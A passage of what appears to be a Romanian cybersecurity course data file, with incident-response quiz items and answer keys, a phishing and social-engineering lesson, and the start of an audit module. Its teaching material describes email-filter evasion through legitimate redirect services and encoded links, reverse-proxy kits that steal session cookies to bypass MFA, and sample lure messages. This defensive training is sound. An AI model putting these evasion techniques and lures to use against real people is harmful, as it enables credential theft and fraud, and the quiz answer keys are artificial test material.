        difficulty: "medium"
      },
      {
        number: 2,
        name: "GDPR 72h notification",
        question: "Cand e obligatorie notificarea autoritatii de protectie a datelor (ANSPDCP) conform GDPR?",
        options: [
          "Mereu, la orice incident",
          "In 72 de ore de la detectarea unui breach care afecteaza date personale cu risc pentru drepturile persoanelor",
          "In 30 de zile",
          "Numai pentru incidente critice"
        ],
        answer: "In 72 de ore de la detectarea unui breach care afecteaza date personale cu risc pentru drepturile persoanelor",
        explanation: "GDPR Art. 33: 72h de la detectare (nu de la incident). Daca nu poti notifica in 72h, notifica partial cu restul informatiilor cat mai curand. Amenda: pana la 10M EUR sau 2% din cifra de afaceri.",
        difficulty: "medium"
      },
      {
        number: 3,
        name: "Containment vs shutdown",
        question: "De ce este preferata izolarea in retea (containment) a unui sistem compromis in loc de oprirea lui?",
        options: [
          "Izolarea e mai usoara",
          "Oprirea distruge datele volatile (RAM cu procese, conexiuni, chei criptare) cruciale pentru investigatie — izolarea le pastreaza",
          "Sistemul nu se mai poate opri dupa compromitere",
          "GDPR interzice oprirea"
        ],
        answer: "Oprirea distruge datele volatile (RAM cu procese, conexiuni, chei criptare) cruciale pentru investigatie — izolarea le pastreaza",
        explanation: "RAM poate contine: procesul malware in memorie, cheile de criptare C2, parole in plaintext, conexiunile active. Izolare retea: sistemul ruleaza dar nu poate comunica.",
        difficulty: "medium"
      },
      {
        number: 4,
        name: "AWS EC2 quarantine",
        question: "Scrie comanda AWS CLI pentru a izola un EC2 compromis prin schimbarea Security Group-ului la unul de carantina (sg-quarantine).",
        type: "coding",
        language: "bash",
        starterCode: "# Instance ID: i-0123456789abcdef0\n# Noul Security Group: sg-quarantine (blocheaza tot traficul)\n# Hint: aws ec2 modify-instance-attribute --groups",
        options: [],
        answer: "",
        explanation: "aws ec2 modify-instance-attribute --instance-id i-0123456789abcdef0 --groups sg-quarantine",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 5,
        name: "MTTD MTTR",
        question: "Ce sunt MTTD si MTTR in Incident Response si de ce conteaza?",
        options: [
          "Tipuri de atacuri",
          "Mean Time to Detect si Mean Time to Respond — masoara eficienta echipei IR; IBM 2024: MTTD mediu = 194 zile, redus la 99 cu AI",
          "Metode de criptare",
          "Tipuri de rapoarte"
        ],
        answer: "Mean Time to Detect si Mean Time to Respond — masoara eficienta echipei IR; IBM 2024: MTTD mediu = 194 zile, redus la 99 cu AI",
        explanation: "MTTD mic = detectezi rapid. MTTR mic = rasp rapid. IBM Cost of Data Breach: companiile cu MTTD < 200 zile au costuri cu 30% mai mici.",
        difficulty: "medium"
      },
      {
        number: 6,
        name: "Blameless postmortem",
        question: "Ce este Blameless Postmortem (Google SRE) si de ce e superior postmortem-ului traditional cu identificarea vinovatilor?",
        options: [
          "E mai rapid",
          "Cauta cauze sistemice nu vinovati — oamenii recunosc deschis greselile, impartasesc informatii complete, se imbunatatesc procesele",
          "E mai ieftin",
          "E cerut de GDPR"
        ],
        answer: "Cauta cauze sistemice nu vinovati — oamenii recunosc deschis greselile, impartasesc informatii complete, se imbunatatesc procesele",
        explanation: "Cultura blameless: nimeni nu ascunde informatii de frica pedepsei. Se identifica: ce procese/tools au esuat, nu cine a gresit. Adoptat de Google, Amazon, Netflix.",
        difficulty: "medium"
      },
      {
        number: 7,
        name: "Splunk IR query",
        question: "Scrie o query Splunk care detecteaza lateral movement (autentificari Windows de tip Network de la un singur IP catre mai mult de 5 hosturi).",
        type: "coding",
        language: "splunk",
        starterCode: "// Detecteaza lateral movement in Windows Event Logs\n// EventCode 4624, Logon_Type 3 (Network logon)\n// Grupeaza per src_ip si dest_host\n// Alerta cand un IP se autentifica pe > 5 hosturi",
        options: [],
        answer: "",
        explanation: "index=windows EventCode=4624 Logon_Type=3 | stats dc(dest_host) as nr_hosturi by src_ip | where nr_hosturi > 5",
        difficulty: "hard",
        expectedOutput: ""
      },
      {
        number: 8,
        name: "5 Whys",
        question: "Ce este tehnica 5 Whys in Root Cause Analysis si cand o folosesti in IR?",
        options: [
          "5 intrebari despre impact",
          "Tehnica de a intreba 'De ce?' de 5 ori consecutiv pentru a ajunge la cauza radacina sistemica a unui incident",
          "5 pasi de remediere",
          "5 metrice de performanta"
        ],
        answer: "Tehnica de a intreba 'De ce?' de 5 ori consecutiv pentru a ajunge la cauza radacina sistemica a unui incident",
        explanation: "Breach prin SQL injection: De ce? Input nefiltrat. De ce? Developer nu cunostea OWASP. De ce? Nu exista training. De ce? Nu era in onboarding. Root cause = onboarding inadequat.",
        difficulty: "medium"
      },
      {
        number: 9,
        name: "Evidence preservation",
        question: "Ce actiuni NU trebuie sa faci pe un sistem compromis pentru a nu distruge dovezile forensice?",
        options: [
          "Capturezi memoria RAM",
          "Rulezi antivirus, stergi fisiere suspecte, repornesti sistemul, modifici timestamps — distrug dovezi si Chain of Custody",
          "Izolezi in retea",
          "Faci o fotografie ecranului"
        ],
        answer: "Rulezi antivirus, stergi fisiere suspecte, repornesti sistemul, modifici timestamps — distrug dovezi si Chain of Custody",
        explanation: "Antivirus sterge malware-ul (proba). Reboot sterge RAM. Modifici fisier = schimbi atime/mtime (timeline distrusa). Colecteaza mai intai, curata dupa.",
        difficulty: "medium"
      },
      {
        number: 10,
        name: "Playbook",
        question: "Ce este un IR Playbook si ce contine?",
        options: [
          "Un document de marketing",
          "Proceduri pas-cu-pas predefinite pentru tipuri specifice de incidente (ransomware, phishing, breach) — reduce MTTR si asigura consistenta",
          "Un tool de monitorizare",
          "Un checklist de audit"
        ],
        answer: "Proceduri pas-cu-pas predefinite pentru tipuri specifice de incidente (ransomware, phishing, breach) — reduce MTTR si asigura consistenta",
        explanation: "Playbook ransomware: pas 1 izolare, pas 2 snapshot VM, pas 3 identificare varianta, pas 4 notificare management... Elimina haosul sub presiune.",
        difficulty: "easy"
      },
      {
        number: 11,
        name: "EDR capabilities",
        question: "Ce face un EDR (Endpoint Detection and Response) in plus fata de un antivirus traditional?",
        options: [
          "Scaneaza mai rapid",
          "Detectie comportamentala (nu doar signatures), telemetrie continua, izolare automata, threat hunting, forensic data — detecteaza zero-days",
          "E mai ieftin",
          "Suporta mai multe OS-uri"
        ],
        answer: "Detectie comportamentala (nu doar signatures), telemetrie continua, izolare automata, threat hunting, forensic data — detecteaza zero-days",
        explanation: "AV traditional: cauta signatures cunoscute (fail pe zero-day). EDR: detecteaza comportament suspect (process injection, credential dumping) indiferent de signature.",
        difficulty: "medium"
      },
      {
        number: 12,
        name: "Backdoor hunting",
        question: "Scrie comenzi Linux pentru a gasi fisiere executabile create/modificate dupa un timestamp de referinta (incident_time) si crontab-urile suspecte.",
        type: "coding",
        language: "bash",
        starterCode: "# Fisierul de referinta timestamp: /tmp/incident_time\n# (touch -t 202501151400 /tmp/incident_time)\n\n# 1. Gaseste fisiere executabile mai noi decat incident_time\n# 2. Listeaza crontab-urile tuturor userilor\n# 3. Verifica /etc/cron.d/",
        options: [],
        answer: "",
        explanation: "find / -newer /tmp/incident_time -type f -executable 2>/dev/null; crontab -l; for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done; ls /etc/cron.d/",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 13,
        name: "AWS IAM deny compromised",
        question: "Scrie o comanda AWS CLI care adauga o policy Deny All pe un user IAM compromis (fara stergerea lui — pastreaza audit trail).",
        type: "coding",
        language: "bash",
        starterCode: "# User compromis: hacked-developer\n# Adauga o inline policy 'DenyAll' care denies toate actiunile\n# Nu sterge userul — pastreaza pentru investigatie\n# Hint: aws iam put-user-policy",
        options: [],
        answer: "",
        explanation: "aws iam put-user-policy --user-name hacked-developer --policy-name DenyAll --policy-document '{\"Statement\":[{\"Effect\":\"Deny\",\"Action\":\"*\",\"Resource\":\"*\"}]}'",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 14,
        name: "IR cost breach",
        question: "Care sunt cei mai importanti factori care reduc costul unui data breach conform IBM Cost of Data Breach Report?",
        options: [
          "Marimea companiei",
          "IR team format si testat, AI/automation in security, detectie rapida (MTTD < 200 zile), criptarea datelor",
          "Numarul de angajati",
          "Localizarea geografica"
        ],
        answer: "IR team format si testat, AI/automation in security, detectie rapida (MTTD < 200 zile), criptarea datelor",
        explanation: "IBM 2024: AI security reduce costul cu $2.2M. IR team cu exercitii regulate reduce cu $1.5M. Detectie < 200 zile: economie de $1.1M fata de medie.",
        difficulty: "medium"
      },
      {
        number: 15,
        name: "Incident severity classification",
        question: "Clasifici un incident in care un angajat a primit un email de phishing si a introdus credentialele pe un site fals, dar nu s-au detectat accese neautorizate. Ce severitate ii atribui?",
        options: [
          "LOW — nu s-a intamplat nimic",
          "HIGH — credentiale compromise reprezinta acces potential la sisteme interne; investigatie si reset imediat necesare",
          "CRITICAL — ransomware activ",
          "MEDIUM dupa o saptamana de investigatie"
        ],
        answer: "HIGH — credentiale compromise reprezinta acces potential la sisteme interne; investigatie si reset imediat necesare",
        explanation: "Credentiale phished = HIGH chiar fara confirmare de breach. Trebuie: reset parola imediat, invalidare sesiuni, investigatie log-uri, posibil activare MFA daca nu era.",
        difficulty: "medium"
      }
    ]
  },
  {
    slug: "social-engineering-phishing",
    title: "29. Social Engineering si Phishing",
    order: 29,
    theory: [
      {
        order: 1,
        title: "Social Engineering — principii psihologice si tipuri de atacuri",
        content: "**Social Engineering** exploateaza psihologia umana in loc de vulnerabilitati tehnice. Omul e veriga cea mai slaba.\n\n**Principiile psihologice exploatate (Cialdini):**\n```\n1. AUTORITATE — \"Sunt de la IT, am nevoie de parola\"\n2. URGENTA — \"Contul tau va fi suspendat in 2 ore!\"\n3. RECIPROCITATE — \"Ti-am ajutat cu asta, ajuta-ma si tu\"\n4. VALIDARE SOCIALA — \"Toti colegii tai au facut asta\"\n5. SIMPATIE — Atacatorul se preface prietenos, agreabil\n6. RARITATE — \"Aceasta oferta expira in 24h\"\n7. FRICA — \"Sistemul tau e infectat! Suna imediat!\"\n```\n\n**Tipuri de atacuri:**\n\n**Pretexting:**\n```\nAtacatorul construieste un scenariu fals (pretext):\n- \"Sunt auditorul extern, am nevoie de acces la server\"\n- \"Sunt de la departamentul IT headquarterele, investigam o problema\"\n- \"Sunt partenerul bancii, actualizam sistemul\"\n\nRequisite pretext bun:\n→ Cercetare prealabila (OSINT: LinkedIn, site companie)\n→ Jargon specific industriei\n→ Detalii veridice (nu sa fie prins)\n→ Scenariul rezolva o problema reala pentru victima\n```\n\n**Vishing (Voice Phishing):**\n```\nApel telefonic:\n- Spoofing caller ID (apare numarul bancii)\n- \"Suntem de la Banca X, am detectat tranzactii suspecte\"\n- Victima e speriata si coopereaza\n- Cer date card, OTP SMS\n\nDefense: Inchide si suna tu inapoi la numarul oficial!\n```\n\n**Smishing (SMS Phishing):**\n```\nSMS: \"Pachetul tau DHL a fost oprit la vama.\nPlatiti 3 lei taxa: https://dhl-ro.malicious.com\"\n```\n\n**Interview tip:** 90%+ din incidentele de securitate incep cu social engineering (Verizon DBIR 2024). Technical controls sunt bypass-ate prin om."
      },
      {
        order: 2,
        title: "Phishing avansat — Spear Phishing, Whaling si BEC",
        content: "**Phishing generic** = email de masa, tinta nedefinita.\n**Spear Phishing** = email tintit, personalizat la o persoana specifica.\n\n```\nPhishing generic:\nDe la: support@payp4l-security.com\nCatre: lista de 10.000 adrese\nSubiect: Verifica-ti contul\n\nSpear Phishing (IoT CISO):\nDe la: cfo-spoofed@companie-reala.com (spoofed sau typosquatted)\nCatre: ana.ionescu@target-company.ro\nSubiect: Raport financiar Q3 — actiune necesara\n\n\"Ana, asa cum am discutat la conferinta de saptamana\ntrecuta, te rog sa verifici raportul atasat privind\nbugetul IT pentru proiectul CloudMigration. Am nevoie\nde aprobarea ta pana la 17:00.\nMultumesc,\nMihai Popescu, CFO\"\n\n[atasament: Raport_Q3_2025.xlsm]  ← macro malitios!\n```\n\n**Whaling** = spear phishing targetat la C-level (CEO, CFO, CTO).\n\n**BEC (Business Email Compromise):**\n```\n1. Atacatorul compromite emailul unui executiv (sau spoofing)\n2. Trimite email catre departamentul financiar:\n   \"Urgent: transferati 150.000 EUR in contul de mai jos\n    pentru achizitia urgenta aprobata azi.\n    Cont: [cont attackator]\n    Mentionati CONFIDENTIAL — nu discutati cu nimeni\"\n3. Rezultat: FBI IC3 2023: BEC = $2.9 miliarde pierderi!\n\nProtectie BEC:\n- Verificare telefonica INTOTDEAUNA pentru transferuri mari\n- Politica: niciun transfer > X EUR fara aprobare duala\n- DMARC/DKIM/SPF configurat\n- Training angajati\n```\n\n**Interview tip:** DMARC (Domain-based Message Authentication) previne email spoofing. 70% din domenii Fortune 500 nu aveau DMARC configurat corect in 2023."
      },
      {
        order: 3,
        title: "Phishing tehnic — infrastructura, evasion si detectie",
        content: "**Infrastructura phishing moderna:**\n\n```\nKit phishing complet:\n1. Domeniu typosquatted: paypa1.com, g00gle.com\n   sau lookalike: paypal-security.com, googIe.com (I in loc de l)\n\n2. Certificat SSL (Let's Encrypt — GRATUIT):\n   https://paypa1.com — browser arata lacatul VERDE!\n   ATENTIE: lacat verde ≠ site legitim! = doar conexiune criptata\n\n3. Clone exacta a site-ului real (HTTrack, Goclone)\n\n4. Reverse proxy (Evilginx, Modlishka):\n   Victima → Evilginx → Site real\n   Evilginx captureaza: credentials + session cookies (bypass MFA!)\n\n5. Email delivery:\n   - Domeniu nou cu warming (pentru reputatie)\n   - SPF/DKIM configurat (trece filtre)\n   - Trimis in ore de business\n```\n\n**Tehnici de evasion filtre email:**\n```python\n# Redirectionare prin servicii legitime:\nhttps://docs.google.com/document/redirect?url=https://phishing.com\nhttps://forms.office.com/redirect?url=https://phishing.com\n\n# Imagini in loc de text (OCR bypass):\n# Emailul contine doar o imagine cu mesajul si link-ul\n\n# HTML encoding special:\n<a href=\"&#104;&#116;&#116;&#112;&#115;://phishing.com\">Click</a>\n# = https://phishing.com dupa decode\n```\n\n**Detectie phishing:**\n```python\n# Verificari tehnice:\nimport re\nfrom urllib.parse import urlparse\n\ndef verifica_url_suspicios(url):\n    parsed = urlparse(url)\n    hostname = parsed.hostname or ''\n\n    # 1. Typosquatting comun:\n    suspicioase = ['paypa1', 'g00gle', 'micrsoft', 'arnazon']\n    if any(s in hostname for s in suspicioase):\n        return True, 'Typosquatting detectat'\n\n    # 2. Prea multi subdomenii:\n    if hostname.count('.') > 3:\n        return True, 'Prea multi subdomenii'\n\n    # 3. IP in loc de hostname:\n    if re.match(r'^\\d+\\.\\d+\\.\\d+\\.\\d+$', hostname):\n        return True, 'IP in URL'\n\n    # 4. Caractere Unicode homograph:\n    if not hostname.isascii():\n        return True, 'Homograph attack potential'\n\n    return False, 'OK'\n```\n\n**Interview tip:** Evilginx/Modlishka bypass TOTP MFA prin capturarea session cookie-ului in timp real. Singura protectie reala = FIDO2/WebAuthn (leaga autentificarea de domeniu)."
      },
      {
        order: 4,
        title: "Awareness Training si Simulari de Phishing",
        content: "**Security Awareness Training** = educarea angajatilor sa recunoasca si sa raporteze atacuri.\n\n**Componentele unui program eficient:**\n```\n1. TRAINING REGULAT (nu o data pe an!):\n   - Module interactive (nu slide-uri plictisitoare)\n   - Scenarii reale din industrie\n   - Gamification — puncte, clasificari\n   - Microlearning (5-10 min, frecvent)\n\n2. PHISHING SIMULATIONS:\n   - GoPhish (open-source), KnowBe4 (comercial)\n   - Template-uri reale (nu obvious)\n   - Click rate benchmark: industrie = 15-20%, obiectiv < 5%\n   - Nu pedepsire — invatare immediata la click\n\n3. RAPORTARE USOARA:\n   - Buton 'Report Phishing' in email client\n   - Numar/email dedicat (phishing@companie.ro)\n   - Feedback rapid: \"Ai raportat corect!\"\n\n4. METRICI:\n   - Phishing click rate\n   - Report rate (vrei sa raporteze!)\n   - Training completion rate\n   - Repeat clickers (angajati care au nevoie de atentie extra)\n```\n\n**GoPhish — simulare phishing open-source:**\n```bash\n# Setup GoPhish:\nwget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip\nunzip gophish*.zip\n./gophish &\n# Acces UI: https://localhost:3333\n# Default creds: admin/gophish\n\n# Componente campanie:\n# - Sending Profile: SMTP server configuratie\n# - Landing Page: pagina clona (HTML)\n# - Email Template: emailul de phishing\n# - Group: lista de target-uri (angajati)\n# - Campaign: combina toate + launch\n```\n\n**Interview tip:** Angajatii care raporteaza phishing sunt mai valorosi decat cei care nu dau click. Cultura de raportare = early warning system. KnowBe4 pricing: ~25-30 USD/user/an."
      }
    ],
    tasks: [
      {
        number: 1,
        name: "Spear phishing vs phishing",
        question: "Ce diferentiaza Spear Phishing de Phishing generic?",
        options: [
          "Spear phishing foloseste malware, phishing generic nu",
          "Spear phishing e personalizat la o tinta specifica cu informatii reale — mult mai credibil si eficient",
          "Phishing generic e mai periculos",
          "Nu exista diferenta practica"
        ],
        answer: "Spear phishing e personalizat la o tinta specifica cu informatii reale — mult mai credibil si eficient",
        explanation: "Spear phishing: cercetare pe LinkedIn/social media, email personalizat cu detalii reale (proiecte, colegi, terminologie). Click rate: phishing generic 3%, spear phishing 70%+.",
        difficulty: "easy"
      },
      {
        number: 2,
        name: "BEC prevention",
        question: "Care e masura cea mai eficienta de prevenire a Business Email Compromise (BEC)?",
        options: [
          "Antivirus avansat",
          "Verificare telefonica out-of-band la numarul oficial pentru orice transfer bancar, plus politica de aprobare duala pentru transferuri mari",
          "Filtre spam mai bune",
          "Parole mai lungi"
        ],
        answer: "Verificare telefonica out-of-band la numarul oficial pentru orice transfer bancar, plus politica de aprobare duala pentru transferuri mari",
        explanation: "BEC bypassa filtrele tehnice (email poate parea legitim). Singurul fail-safe: verifica telefonic la numarul CUNOSCUT (nu cel din email). FBI IC3: $2.9B pierderi BEC in 2023.",
        difficulty: "medium"
      },
      {
        number: 3,
        name: "DMARC protection",
        question: "Ce face DMARC (Domain-based Message Authentication) si cum previne phishing-ul?",
        options: [
          "Cripteaza emailurile",
          "Permite proprietarilor de domenii sa specifice cum serverele receptoare sa trateze emailuri care esueaza autentificarea SPF/DKIM — previne spoofing",
          "Scaneaza atasamentele",
          "Blocheaza spamul"
        ],
        answer: "Permite proprietarilor de domenii sa specifice cum serverele receptoare sa trateze emailuri care esueaza autentificarea SPF/DKIM — previne spoofing",
        explanation: "DMARC p=reject: emailuri de la domeniu tau care nu trec SPF/DKIM sunt respinse automat. Atacatorul nu poate trimite email aparent din @banca-ta.ro.",
        difficulty: "medium"
      },
      {
        number: 4,
        name: "Evilginx bypass MFA",
        question: "Cum bypassa Evilginx (reverse proxy phishing) autentificarea TOTP (Google Authenticator)?",
        options: [
          "Sparge codul TOTP",
          "Intercepteaza si captureaza session cookie-ul dupa autentificarea reusita — nu are nevoie de codul TOTP in viitor",
          "Dezactiveaza MFA",
          "Nu poate bypassa MFA"
        ],
        answer: "Intercepteaza si captureaza session cookie-ul dupa autentificarea reusita — nu are nevoie de codul TOTP in viitor",
        explanation: "Victima introduce user, parola si codul TOTP pe Evilginx care le paseaza site-ului real. Dupa autentificare, Evilginx captureaza session cookie — atacatorul il foloseste direct.",
        difficulty: "hard"
      },
      {
        number: 5,
        name: "Pretexting OSINT",
        question: "Ce informatii colecteaza atacatorul din OSINT (LinkedIn) pentru a construi un pretext credibil?",
        options: [
          "Parola",
          "Titlul jobului, colegi, proiecte curente, jargon specific, ierarhia organizationala — pentru email personalizat credibil",
          "Adresa de acasa",
          "Istoricul tranzactiilor"
        ],
        answer: "Titlul jobului, colegi, proiecte curente, jargon specific, ierarhia organizationala — pentru email personalizat credibil",
        explanation: "LinkedIn: \"Am vazut ca lucrezi cu Ana Ionescu la proiectul CloudMigration...\" — victima crede ca atacatorul e cunoscut. Detalii reale = incredere sporita.",
        difficulty: "medium"
      },
      {
        number: 6,
        name: "Phishing URL detection",
        question: "Scrie o functie Python care detecteaza URL-uri suspecte de phishing prin verificarea typosquatting-ului si a IP-urilor in URL.",
        type: "coding",
        language: "python",
        starterCode: "from urllib.parse import urlparse\nimport re\n\nBRANDS_SUSPECTE = ['paypa1', 'g00gle', 'micrsoft', 'arnazon', 'facebok']\n\ndef este_phishing(url):\n    parsed = urlparse(url)\n    hostname = parsed.hostname or ''\n    \n    # verifica typosquatting (hostname contine brand suspicios)\n    # verifica daca e IP in loc de hostname\n    # returneaza (bool, motiv)\n    pass\n\nprint(este_phishing('https://paypa1.com/login'))\nprint(este_phishing('https://192.168.1.100/paypal'))\nprint(este_phishing('https://paypal.com/login'))",
        options: [],
        answer: "",
        explanation: "for brand in BRANDS_SUSPECTE: if brand in hostname: return True, f'Typosquatting: {brand}'; if re.match(r'^\\d+\\.\\d+\\.\\d+\\.\\d+$', hostname): return True, 'IP in URL'; return False, 'OK'",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 7,
        name: "GoPhish campaign",
        question: "Ce componente trebuie configurate in GoPhish pentru a lansa o campanie de phishing simulation?",
        options: [
          "Doar email template",
          "Sending Profile (SMTP), Landing Page (clone), Email Template, Group (target list), Campaign (le combina)",
          "Doar lista de emailuri",
          "Numai serverul SMTP"
        ],
        answer: "Sending Profile (SMTP), Landing Page (clone), Email Template, Group (target list), Campaign (le combina)",
        explanation: "GoPhish: Sending Profile = cum trimiti. Landing Page = unde ajunge utilizatorul. Email Template = ce trimiti. Group = cui trimiti. Campaign = orchestrare.",
        difficulty: "medium"
      },
      {
        number: 8,
        name: "FIDO2 phishing resistance",
        question: "De ce FIDO2/WebAuthn e singura protectie MFA rezistenta la phishing?",
        options: [
          "E mai greu de implementat",
          "Cheile sunt legate criptografic de domeniu — autentificarea pe paypa1.com nu va functiona chiar daca victima o incearca",
          "E mai rapid",
          "Nu are nevoie de parola"
        ],
        answer: "Cheile sunt legate criptografic de domeniu — autentificarea pe paypa1.com nu va functiona chiar daca victima o incearca",
        explanation: "FIDO2: cheia privata e legata de origin (domeniu). paypa1.com != paypal.com → autentificarea esueaza. TOTP: codul valid pe paypal.com e valid si pe phishing site (Evilginx).",
        difficulty: "hard"
      },
      {
        number: 9,
        name: "Phishing indicators",
        question: "Listeaza 5 indicatori tehnici si vizuali ai unui email de phishing.",
        options: [
          "Font, culoare, dimensiune email",
          "Domeniu expeditor suspect, urgenta artificiala, link-uri cu hover diferit, atasamente neasteptate, greseli gramaticale, DKIM/SPF fail",
          "Ora trimiterii, marimea emailului",
          "Numarul de destinatari"
        ],
        answer: "Domeniu expeditor suspect, urgenta artificiala, link-uri cu hover diferit, atasamente neasteptate, greseli gramaticale, DKIM/SPF fail",
        explanation: "Hover peste link: arata URL real diferit de textul afisat. DKIM fail in header-ele email. Urgenta: 'actiune necesara in 2 ore'. Atasament: .xlsm, .docm (macro enabled).",
        difficulty: "medium"
      },
      {
        number: 10,
        name: "Vishing defense",
        question: "Care e apararea corecta impotriva Vishing (apeluri telefonice frauduloase)?",
        options: [
          "Nu raspunzi la telefon",
          "Inchizi, verifici numarul oficial in mod independent si suni TU inapoi — nu dai niciodata informatii la apeluri primite neasteptat",
          "Ceri numarul apelantului",
          "Folosesti aplicatia bancii"
        ],
        answer: "Inchizi, verifici numarul oficial in mod independent si suni TU inapoi — nu dai niciodata informatii la apeluri primite neasteptat",
        explanation: "Caller ID poate fi spoofed sa arate numarul bancii reale. Inchide, cauta tu numarul oficial pe card/site oficial, suna inapoi — daca e legitim te vor ajuta.",
        difficulty: "medium"
      },
      {
        number: 11,
        name: "Awareness program metrics",
        question: "Ce metric e cel mai important intr-un program de security awareness: click rate scazut sau report rate ridicat?",
        options: [
          "Click rate scazut",
          "Ambele conteaza, dar report rate ridicat e mai valoros — angajatii care raporteaza sunt un early warning system activ",
          "Training completion rate",
          "Numarul de incidente"
        ],
        answer: "Ambele conteaza, dar report rate ridicat e mai valoros — angajatii care raporteaza sunt un early warning system activ",
        explanation: "Un click rate de 5% cu report rate de 80% = excelent. Angajatii care raporteaza phishing-ul real alerteaza SOC-ul rapid. Cultura de raportare = defense in depth.",
        difficulty: "medium"
      },
      {
        number: 12,
        name: "Smishing detection",
        question: "Scrie un mesaj SMS de phishing tipic si explica de ce e periculos (format text cu analiza).",
        type: "coding",
        language: "javascript",
        starterCode: "// Analizeaza urmatoarele SMS-uri si identifica:\n// care e phishing si de ce\n\nconst smsuri = [\n    \"Banca Transilvania: Contul dvs. a fost blocat. Deblocati la bt-security-login.com\",\n    \"Ai primit un mesaj nou. Verifica-l in aplicatie.\",\n    \"DHL: Coletul cu nr. 123456 a fost oprit. Taxa vama 3 RON: dhl-romania-tax.net/pay\",\n    \"Salariu creditat: 3500 RON la 16 mai 2025\"\n];\n\n// Scrie functia care identifica mesajele de phishing\nfunction esteSmishing(sms) {\n    // verifica: urgenta, link suspect, cerere date/plata\n}",
        options: [],
        answer: "",
        explanation: "SMS 1 si 3 = phishing: domenii false (bt-security-login.com, dhl-romania-tax.net), urgenta, cerere actiune. Indicatori: domeniu necunoscut, urgenta, cerere plata/date.",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 13,
        name: "SSL certificate phishing",
        question: "De ce prezenta unui certificat SSL valid (lacat verde) NU garanteaza ca un site e legitim?",
        options: [
          "Certificatele SSL nu mai functioneaza",
          "Let's Encrypt emite certificate gratuit pentru orice domeniu — paypa1.com poate avea certificat valid si conexiune HTTPS criptata",
          "Lacat verde inseamna site sigur",
          "Doar certificatele platite sunt sigure"
        ],
        answer: "Let's Encrypt emite certificate gratuit pentru orice domeniu — paypa1.com poate avea certificat valid si conexiune HTTPS criptata",
        explanation: "SSL/TLS = criptarea conexiunii, nu autentificarea site-ului ca legitim. paypa1.com cu HTTPS: conexiunea e criptata, dar trimiti datele atacatorului. Verifica domeniul, nu lacatul!",
        difficulty: "medium"
      },
      {
        number: 14,
        name: "Homograph attack",
        question: "Ce este un homograph attack in domenii web?",
        options: [
          "Un atac prin imagini",
          "Folosirea de caractere Unicode vizual identice cu ASCII pentru a crea domenii false: pаypal.com cu 'а' chirilic in loc de 'a' latin",
          "Un tip de SQL injection",
          "Un atac de tip DoS"
        ],
        answer: "Folosirea de caractere Unicode vizual identice cu ASCII pentru a crea domenii false: pаypal.com cu 'а' chirilic in loc de 'a' latin",
        explanation: "Unicode are mii de caractere care arata identic cu litere ASCII. paypal.com vs pаypal.com (а = U+0430 chirilic). Browserele moderne afiseaza forma Punycode: xn--pypal-4ve.com.",
        difficulty: "hard"
      },
      {
        number: 15,
        name: "Security awareness program",
        question: "Scrie un plan de 4 pasi pentru implementarea unui program de security awareness intr-o companie de 100 angajati.",
        type: "coding",
        language: "javascript",
        starterCode: "// Defineste planul de Security Awareness Program\n// Fiecare pas: activitate, tool, metrica de succes\n\nconst program = {\n    pas1: {\n        activitate: \"\",\n        tool: \"\",\n        metrica: \"\"\n    },\n    // completeaza pas2, pas3, pas4\n};",
        options: [],
        answer: "",
        explanation: "pas1: Baseline phishing simulation (GoPhish), metrica: click rate initial. pas2: Training interactiv (KnowBe4/LMS), metrica: completion rate. pas3: Simulari lunare, metrica: click rate scazut <5%. pas4: Buton Report Phishing + feedback, metrica: report rate crescut.",
        difficulty: "medium",
        expectedOutput: ""
      }
    ]
  },
  {
    slug: "cybersec-audit-mini-project",
    title: "30. Mini Proiect Cybersec — Audit de Securitate Complet",
    order: 30,
    theory: [
      {
        order: 1,
        title: "Metodologia auditului de securitate si planificarea",
        content: "**Auditul de securitate** evalueaza sistematic postura de securitate a unei organizatii.\n\n**Tipuri de audit:**\n```\n1. VULNERABILITY ASSESSMENT\n   - Scan automat al vulnerabilitatilor\n   - Nu exploatare, doar identificare\n   - Tool-uri: Nessus, OpenVAS, Qualys\n   - Output: lista CVE-uri cu severitate\n\n2. PENETRATION TESTING\n   - Exploatare controlata\n   - Demonstrare impact real\n   - Necesita autorizatie scrisa\n\n3. SECURITY AUDIT\n   - Review de politici, proceduri, configuratii\n   - Conformitate cu standarde (ISO 27001, SOC2, PCI DSS)\n   - Interviuri cu personalul\n\n4. RED TEAM EXERCISE\n   - Simulare atac real (APT simulation)\n   - Full scope: phishing, physical, technical\n   - Durata: saptamani/luni\n```\n\n**Checklist pre-audit:**\n```\n[ ] Contract semnat + scope definit\n[ ] Autorizatie scrisa de la management\n[ ] Emergency contact list (cine sun daca ceva se strica)\n[ ] Ferestre de timp aprobate\n[ ] Sisteme excluse (production critical)\n[ ] Metoda de comunicare securizata cu clientul\n[ ] Reguli de escaladare (ce faci daca gasesti ceva critic imediat)\n[ ] Clauzele de confidentialitate (NDA)\n```\n\n**Standarde si framework-uri de audit:**\n- **ISO/IEC 27001** — Management al securitatii informatiei\n- **NIST Cybersecurity Framework** — Identify, Protect, Detect, Respond, Recover\n- **CIS Controls v8** — 18 controale prioritizate\n- **OWASP ASVS** — Application Security Verification Standard\n- **PCI DSS** — pentru organizatii care proceseaza carduri de plata\n\n**Interview tip:** SOC2 Type I = snapshot audit (o zi). SOC2 Type II = audit pe o perioada (3-12 luni). ISO 27001 = certificare formala cu auditor acreditat."
      },
      {
        order: 2,
        title: "Executarea auditului — Reconnaissance, Scanning si Vulnerability Analysis",
